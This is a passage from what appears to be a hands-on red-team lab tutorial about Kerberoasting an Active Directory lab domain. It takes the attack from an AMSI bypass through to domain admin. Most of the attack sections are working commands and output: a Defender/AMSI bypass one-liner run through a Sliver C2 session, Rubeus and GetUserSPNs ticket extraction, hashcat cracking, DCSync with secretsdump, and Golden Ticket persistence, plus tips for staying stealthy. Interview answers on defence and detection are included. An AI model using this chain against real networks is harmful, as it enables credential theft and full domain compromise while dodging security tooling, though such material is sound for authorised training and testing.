iisservice      HTTP/app.orsubank.local                ServiceAccounts
backupservice   MSSQLSvc/DC01.orsubank.local:1434     ServiceAccounts
svc_backup      backup/dc01.orsubank.local             Domain Admins  ← TARGET!
```

---

# PART 9: The Attack with Defender Bypass {#part-9-attack-execution}

## 9.1: AMSI Bypass First (Critical!)

**Before running Rubeus, bypass AMSI:**

```bash
# Via Sliver - run AMSI bypass
sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "$x=[Ref].Assembly.GetTypes();ForEach($t in $x){if($t.Name -clike '*siUtils'){$t.GetFields('NonPublic,Static')|%{if($_.Name -clike '*ailed'){$_.SetValue($null,$true)}}}}"
```

**Why this is required:**
- Rubeus.exe is signed and known to Defender
- AMSI scans .NET assemblies before loading
- Without bypass, Rubeus will be blocked

## 9.2: Kerberoasting All SPNs

**Using Rubeus via execute-assembly:**

```bash
# Get all Kerberoastable accounts
sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Rubeus.exe kerberoast /nowrap
```

**Output:**
```
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0 

[*] Action: Kerberoasting

[*] Target Domain          : orsubank.local
[*] Searching path 'LDAP://DC01.orsubank.local/DC=orsubank,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 4

[*] SamAccountName         : svc_sql
[*] DistinguishedName      : CN=svc_sql,CN=Users,DC=orsubank,DC=local
[*] ServicePrincipalName   : MSSQLSvc/sql.orsubank.local:1433
[*] PwdLastSet             : 12/27/2024 8:30:00 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_sql$ORSUBANK.LOCAL$MSSQLSvc/sql.orsubank.local:1433*$81F5AC37E2...

[*] SamAccountName         : svc_backup
[*] DistinguishedName      : CN=svc_backup,CN=Users,DC=orsubank,DC=local
[*] ServicePrincipalName   : backup/dc01.orsubank.local
[*] PwdLastSet             : 12/27/2024 8:30:00 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_backup$ORSUBANK.LOCAL$backup/dc01.orsubank.local*$A2C3D4E5F6...

... (more accounts)
```

## 9.3: Targeted Kerberoasting (Stealthier)

**Request only high-value accounts:**

```bash
# Target only svc_backup (Domain Admin!)
sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Rubeus.exe kerberoast /user:svc_backup /nowrap
```

## 9.4: Requesting RC4 Encryption (Easier to Crack)

```bash
# Force RC4 encryption (faster cracking)
sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Rubeus.exe kerberoast /tgtdeleg /enctype:rc4 /nowrap
```

## 9.5: Alternative Tools

**Using GetUserSPNs.py from Kali (no execution on target):**

```bash
# Run from Kali with harvested credentials
GetUserSPNs.py orsubank.local/vamsi.krishna:'Password123!' -dc-ip 192.168.100.10 -request -outputfile kerberoast_hashes.txt
```

**When to use this:**
- Maximum stealth (nothing runs on target)
- You already have valid credentials
- Target has strong EDR

## 9.6: Saving the Hashes

**Copy hashes to a file on Kali:**

```bash
# Create hash file
nano /tmp/kerberoast.txt

# Paste each hash on its own line
$krb5tgs$23$*svc_sql$ORSUBANK.LOCAL$MSSQLSvc/sql.orsubank.local:1433*$81F5AC37E2...
$krb5tgs$23$*svc_backup$ORSUBANK.LOCAL$backup/dc01.orsubank.local*$A2C3D4E5F6...
```

---

# PART 10: Cracking Methodology {#part-10-cracking}

## 10.1: Hash Mode Selection

| Encryption | Hashcat Mode | Speed (RTX 3090) |
|------------|--------------|------------------|
| RC4 (etype 23) | 13100 | ~2.5M hashes/sec |
| AES128 (etype 17) | 19600 | ~250K hashes/sec |
| AES256 (etype 18) | 19700 | ~250K hashes/sec |

**RC4 is 10x faster to crack!**

## 10.2: Basic Hashcat Attack

```bash
# Basic dictionary attack
hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt
```

## 10.3: With Rules (Recommended)

**Rules add mutations like "password" → "Password!" or "P@ssw0rd123":**

```bash
# Dictionary + best64 rules
hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Dictionary + OneRuleToRuleThemAll (comprehensive)
hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
```

## 10.4: Better Wordlists

```bash
# SecLists - various specialized lists
hashcat -m 13100 hashes.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt

# Custom corporate wordlist
# Include: company name, year, season, common patterns
echo -e "Orsubank2024\\nOrsu@2024\\nBank@2024\\nBanking123\\nOrsubank!" > corporate.txt
hashcat -m 13100 hashes.txt corporate.txt -r best64.rule
```

## 10.5: Combinator Attack

**Combine two wordlists:**

```bash
# Combine "words" with "numbers"
hashcat -m 13100 hashes.txt -a 1 words.txt numbers.txt
```

## 10.6: Reading Results

**Successful crack:**
```
$krb5tgs$23$*svc_backup$ORSUBANK.LOCAL$backup/dc01.orsubank.local*$A2C3D4E5...:Backup@2024!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: /tmp/kerberoast.txt
Time.Started.....: Fri Dec 27 16:30:00 2024
```

**The password is after the colon: `Backup@2024!`**

## 10.7: If Cracking Fails

1. **Extend wordlist**: Add company-specific terms
2. **Add rules**: More mutations
3. **Mask attack**: For patterns like "Service2024!"
   ```bash
   hashcat -m 13100 hashes.txt -a 3 ?u?l?l?l?l?l?l?d?d?d?d
   ```
4. **Hybrid attack**: Wordlist + patterns
   ```bash
   hashcat -m 13100 hashes.txt -a 6 wordlist.txt ?d?d?d?d
   ```
5. **Consider AES**: If you only have AES hashes, cracking is 10x slower

---

# PART 11: Post-Exploitation {#part-11-post-exploitation}

## 11.1: Verify Credentials Work

```bash
# Test with crackmapexec
crackmapexec smb DC01.orsubank.local -u svc_backup -p 'Backup@2024!' -d orsubank.local

# Expected output for admin account:
SMB   192.168.100.10   445   DC01   [+] orsubank.local\svc_backup:Backup@2024! (Pwn3d!)
```

**(Pwn3d!) means you have admin access!**

## 11.2: Check Group Memberships

```bash
# What groups is this account in?
crackmapexec smb DC01.orsubank.local -u svc_backup -p 'Backup@2024!' --groups

# Or via LDAP
ldapsearch -H ldap://192.168.100.10 -D "svc_backup@orsubank.local" -w 'Backup@2024!' \
  -b "DC=orsubank,DC=local" "(sAMAccountName=svc_backup)" memberOf
```

## 11.3: If Account is Domain Admin

**DCSync to dump ALL hashes:**

```bash
# Using secretsdump
secretsdump.py orsubank.local/svc_backup:'Backup@2024!'@DC01.orsubank.local

# Output includes:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe388c00c7e6b5f9b:::
```

**Now you have:**
- Administrator hash → Pass-the-Hash anywhere
- KRBTGT hash → **Golden Ticket** (10-year persistence!)

## 11.4: If Account is NOT Domain Admin

**Check what access you gained:**

```bash
# Can you RDP?
crackmapexec rdp DC01.orsubank.local -u svc_sql -p 'SqlSvc@2024!'

# Can you PSRemote?
crackmapexec winrm DC01.orsubank.local -u svc_sql -p 'SqlSvc@2024!'

# What shares can you access?
crackmapexec smb DC01.orsubank.local -u svc_sql -p 'SqlSvc@2024!' --shares
```

**Continue attack path:**
- Use BloodHound to find path from svc_sql to Domain Admin
- Pivot to machines where svc_sql has access
- Look for credentials on SQL servers

## 11.5: Attack Chain Summary

```
KERBEROASTING → DOMAIN ADMIN:
────────────────────────────────────────────────────────────────

1. Initial Access
   └── vamsi.krishna @ WS01 (regular domain user)

2. Kerberoasting
   └── Bypassed AMSI
   └── Ran Rubeus kerberoast
   └── Got TGS hashes for 4 service accounts

3. Targeted Cracking
   └── Focused on svc_backup (in Domain Admins per BloodHound)
   └── Cracked with hashcat: Backup@2024!

4. Privilege Escalation
   └── svc_backup is Domain Admin
   └── Used secretsdump to DCSync
   └── Got Administrator and KRBTGT hashes

5. Persistence
   └── Golden Ticket with KRBTGT hash
   └── 10+ year persistence

Time: ~1 hour
Detection: LOW (offline cracking, minimal network traffic)
```

---

# PART 12: Interview Questions {#part-12-interview}

## Q1: "Explain Kerberoasting technically - what makes it possible?"

**ANSWER:**
"Kerberoasting exploits the fundamental design of Kerberos TGS ticket encryption.

When a client requests a service ticket (TGS-REQ), the KDC finds the account associated with that SPN and encrypts the TGS ticket with that account's NTLM hash. This design allows the service to decrypt the ticket using its own password.

The vulnerability exists because:
1. ANY domain user can request a TGS for ANY SPN
2. The encrypted ticket data is returned to the requestor
3. The encryption key is derived from the service account's password
4. If the password is weak, we can perform offline dictionary attacks

Technically, the encrypted portion uses RC4-HMAC (etype 23) or AES, depending on configuration. RC4 is significantly faster to crack - about 2.5 million guesses per second on a modern GPU versus 250K for AES.

I use Rubeus with execute-assembly to collect hashes in memory, then hashcat -m 13100 for cracking. The attack requires no special privileges and generates minimal detection artifacts since Kerberos ticket requests are normal behavior."

---

## Q2: "Walk me through the Kerberos authentication flow."

**ANSWER:**
"Kerberos uses a ticket-based authentication system with three phases:

**Phase 1 - Get TGT (Authentication):**
1. Client sends AS-REQ with username and pre-auth (timestamp encrypted with password hash)
2. KDC decrypts pre-auth using user's hash from NTDS.dit
3. If valid, KDC returns AS-REP containing TGT encrypted with KRBTGT's hash
4. Client can decrypt the session key portion with their own hash

**Phase 2 - Get Service Ticket:**
1. Client sends TGS-REQ with TGT and target SPN
2. KDC verifies TGT using KRBTGT's hash
3. KDC finds account with that SPN
4. KDC returns TGS-REP with ticket encrypted using SERVICE ACCOUNT's hash

**Phase 3 - Access Service:**
1. Client sends AP-REQ with service ticket to target service
2. Service decrypts ticket with its own hash
3. Service validates ticket and grants access

The vulnerability in Kerberoasting is in Phase 2 - we request the TGS and try to crack the service account's password offline."

---

## Q3: "What's the difference between RC4 and AES encryption in Kerberos?"

**ANSWER:**
"RC4 and AES refer to the encryption algorithms used for Kerberos tickets:

**RC4-HMAC (etype 23):**
- Uses the NTLM hash directly as the encryption key
- Cracking speed: ~2.5 million hashes/second on GPU
- Hashcat mode 13100
- Common in older or misconfigured environments
- Microsoft recommends disabling it

**AES (etypes 17/18):**
- Uses PBKDF2 to derive keys from the password
- Cracking speed: ~250K hashes/second (10x slower)
- Hashcat modes 19600 (AES128) and 19700 (AES256)
- More secure, recommended by Microsoft

**Practical implications:**
- Always try to get RC4 hashes when possible
- Rubeus can request RC4 specifically: `/enctype:rc4`
- If service only supports AES, cracking takes 10x longer
- Defense: Configure accounts for AES-only by enabling 'This account supports AES encryption' and disabling DES/RC4"

---

## Q4: "How do you find Kerberoastable accounts?"

**ANSWER:**
"An account is Kerberoastable if it's a user account (not computer) with an SPN set.

**Via BloodHound:**
```cypher
MATCH (u:User {hasspn: true}) RETURN u.name, u.pwdlastset
```
Or use the pre-built 'List all Kerberoastable Accounts' query.

**Via LDAP:**
```
(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))
```

**Via PowerShell:**
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet
```

**Via Rubeus:**
```
Rubeus.exe kerberoast /stats
```
This shows Kerberoastable accounts without extracting tickets.

**Prioritization:**
I prioritize by group memberships (BloodHound path to DA), password age (older = likely weaker), and encryption type (RC4 = faster to crack)."

---

## Q5: "What tools do you use for Kerberoasting and why?"

**ANSWER:**
"**Collection:**
- **Rubeus (C#)**: My primary tool. Runs via execute-assembly in memory, leaving minimal artifacts. Supports targeted extraction, encryption type selection, and stat gathering.
- **GetUserSPNs.py (Impacket)**: For remote Kerberoasting from Linux without executing anything on target. Maximum stealth.
- **Invoke-Kerberoast (PowerShell)**: Less preferred due to PowerShell logging, but works if that's all available.

**Cracking:**
- **Hashcat**: Primary cracker. GPU-accelerated, supports rules, multiple attack modes. Mode 13100 for RC4, 19600/19700 for AES.
- **John the Ripper**: Alternative, slightly slower but good for quick checks.

**My workflow:**
1. AMSI bypass via Sliver
2. `execute-assembly Rubeus.exe kerberoast /user:target /nowrap`
3. Copy hash to Kali
4. `hashcat -m 13100 hash.txt rockyou.txt -r best64.rule`
5. Verify with crackmapexec"

---

## Q6: "How would you defend against Kerberoasting?"

**ANSWER:**
"Multi-layered defense:

**Password Strength:**
- Minimum 25+ character random passwords for service accounts
- Use gMSAs (Group Managed Service Accounts) where possible - 240-bit random, auto-rotating

**Encryption:**
- Configure service accounts for AES-only encryption
- Disable RC4: Set `msDS-SupportedEncryptionTypes` to 24 (AES only)
- AES is 10x slower to crack

**Reduce Attack Surface:**
- Audit SPNs regularly: `Get-ADUser -Filter {ServicePrincipalName -ne '$null'}`
- Remove unnecessary SPNs
- Don't put service accounts in privileged groups

**Detection:**
- Monitor Event ID 4769 (Kerberos service ticket requests)
- Alert on: Many requests from one user, RC4 requests, unusual SPNs
- Honeypot SPNs: Create fake service accounts with enticing names

**Privilege Reduction:**
- Service accounts should have ONLY the permissions they need
- Never put service accounts in Domain Admins"

---

## Q7: "What is targeted Kerberoasting?"

**ANSWER:**
"Targeted Kerberoasting is requesting tickets only for specific high-value accounts rather than all Kerberoastable accounts.

**Why it's better:**
1. **Less noise**: Requesting one ticket vs. dozens
2. **Fewer logs**: One Event 4769 instead of many
3. **Focused effort**: Crack the most valuable target first
4. **Evades detection**: Volume-based alerts don't trigger

**How to do it:**
```bash
# First, identify high-value targets with BloodHound
# Cypher: Users with SPNs that have path to DA

# Then, request only that one:
Rubeus.exe kerberoast /user:svc_backup /nowrap
```

**When to use:**
- When stealth is important
- When you already know which account has value (via BloodHound)
- When you want to minimize Event logs

**Contrast with traditional Kerberoasting:**
- Traditional: Get ALL tickets, sort by value later
- Targeted: Get ONLY the most valuable ticket"

---

## Q8: "Explain the targeted Kerberoasting attack using ACL abuse."

**ANSWER:**
"If you have GenericAll or GenericWrite on a user account, you can make ANY user Kerberoastable:

**The Attack:**
1. Add an SPN to the target user
2. Request TGS for that SPN
3. Crack the hash
4. Remove the SPN (cleanup)

**Example:**
```powershell
# Add SPN to target (via Sliver)
Set-ADUser -Identity domain_admin -ServicePrincipalName @{Add='HTTP/pwned.orsubank.local'}

# Request the ticket
Rubeus.exe kerberoast /user:domain_admin /nowrap

# Remove SPN
Set-ADUser -Identity domain_admin -ServicePrincipalName @{Remove='HTTP/pwned.orsubank.local'}
```

**Why this is powerful:**
- Normally a Domain Admin account has no SPN
- GenericAll lets us temporarily SET an SPN
- Now we can Kerberoast what was previously not Kerberoastable
- Works on any user account we can modify

**BloodHound shows this:**
Objects we have GenericAll/GenericWrite on are potential targeted Kerberoasting victims."

---

## Q9: "What's the difference between a TGT and TGS in Kerberos?"

**ANSWER:**
"**TGT (Ticket Granting Ticket):**
- Your 'master ticket' obtained after authentication
- Encrypted with KRBTGT account's hash
- You present this to get service tickets
- Cannot be Kerberoasted (KRBTGT has random 128+ char password)
- 10-hour default lifetime
- Forging TGTs = Golden Ticket attack (requires KRBTGT hash)

**TGS (Ticket Granting Service / Service Ticket):**
- A ticket for a specific service
- Encrypted with the SERVICE ACCOUNT's hash
- CAN be Kerberoasted if service account has weak password
- Used to access the actual service
- Also 10-hour default lifetime
- Forging TGS = Silver Ticket attack (requires service hash)

**The key difference for attackers:**
- TGT encryption key (KRBTGT) is uncrackable
- TGS encryption key (service account) might be crackable
- This is why we target TGS tickets in Kerberoasting"

---

## Q10: "How would you detect my Kerberoasting activity?"

**ANSWER:**
"As a defender, I'd look for these indicators:

**Event Log Monitoring:**
- Event ID 4769: Kerberos Service Ticket Request
- Alert on: Many 4769 from single user in short time
- Alert on: RC4 encryption type (Ticket Encryption Type: 0x17)
- Alert on: Requests for unusual/all SPNs

**Behavioral Analysis:**
- Baseline normal TGS request patterns
- Flag users requesting many different services rapidly
- Flag service ticket requests from non-server computers
- Flag requests during off-hours

**Honeypots:**
- Create fake service accounts: 'svc_admin_backup', 'sql_production'
- Set weak passwords
- Any request for these SPNs = immediate alert
- Attackers running 'kerberoast /all' will hit them

**Network Monitoring:**
- TGS-REQ packets to KDC at unusual volume
- Correlation: LDAP enumeration followed by TGS requests

**EDR:**
- Rubeus.exe execution or similar tools
- Execute-assembly patterns
- AMSI bypass signatures

The best detection combines multiple data sources - an attacker requesting tickets from a workstation that just ran LDAP enumeration is highly suspicious."

---

# PART 13: Troubleshooting {#part-13-troubleshoot}

## 13.1: Rubeus Blocked by AMSI/Defender

**Always bypass AMSI first:**
```bash
sliver > execute -o powershell.exe -Command "$x=[Ref].Assembly.GetTypes();ForEach($t in $x){if($t.Name -clike '*siUtils'){$t.GetFields('NonPublic,Static')|%{if($_.Name -clike '*ailed'){$_.SetValue($null,$true)}}}}"
```

**Alternative:** Use GetUserSPNs.py from Kali instead.

## 13.2: No Kerberoastable Accounts Found

**Check manually:**
```bash
sliver > execute -o powershell.exe -Command "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName | Select Name,ServicePrincipalName"
```

**If none exist:**
- Lab not set up correctly
- Run `Enable-Kerberoasting.ps1` on DC01

## 13.3: Hashcat Can't Recognize Format

**Ensure proper format:**
```
$krb5tgs$23$*username$REALM$spn*$hash_data...
```

**Check for line wrapping issues.** Use `/nowrap` in Rubeus.

## 13.4: Cracking Takes Too Long

1. Start with RC4 hashes (mode 13100)
2. Use targeted wordlists (company name, year, etc.)
3. Apply rules strategically
4. Consider cloud cracking services for AES

## 13.5: Credentials Don't Work After Cracking

**Password might have changed.** Check pwdLastSet:
```powershell
Get-ADUser svc_backup -Properties PasswordLastSet
```

If password was changed AFTER you got the ticket, it won't work.

---

# ✅ VERIFICATION CHECKLIST

- [ ] Understand Kerberos TGT vs TGS flow
- [ ] Know why TGS is encrypted with service account hash
- [ ] Ran Enable-Kerberoasting.ps1 on DC01
- [ ] Applied AMSI bypass in Sliver
- [ ] Ran Rubeus kerberoast via execute-assembly
- [ ] Saved hashes correctly (no line wrapping)
- [ ] Cracked hashes with hashcat -m 13100
- [ ] Verified credentials work
- [ ] Identified if account is privileged (BloodHound)
- [ ] Can answer all 10 interview questions

---

# 🔗 Next Steps

**If you got Domain Admin (svc_backup):**
→ **[04b. DCSync](./04b_dcsync_attack.md)** - Dump all domain hashes
→ **[07. Golden Ticket](./07_golden_ticket.md)** - Create persistent access

**If you need to escalate further:**
→ **[05. ACL Abuse](./05_acl_abuse.md)** - Abuse permissions
→ **[06. Pass-the-Hash](./06_pass_the_hash.md)** - Lateral movement

**Related attacks:**
→ **[03. AS-REP Roasting](./03_asrep_roasting.md)** - Similar offline attack
→ **[04. Credential Dumping](./04_credential_dumping.md)** - Dump LSASS

---

**MITRE ATT&CK Mapping:**

| Technique | ID | Description |
|-----------|-----|-------------|
| Steal or Forge Kerberos Tickets: Kerberoasting | T1558.003 | Request TGS and crack offline |
| Credential Access | T1003 | Obtaining credential material |

---

**Interview Importance:** ⭐⭐⭐⭐⭐ (Asked in almost EVERY AD interview)

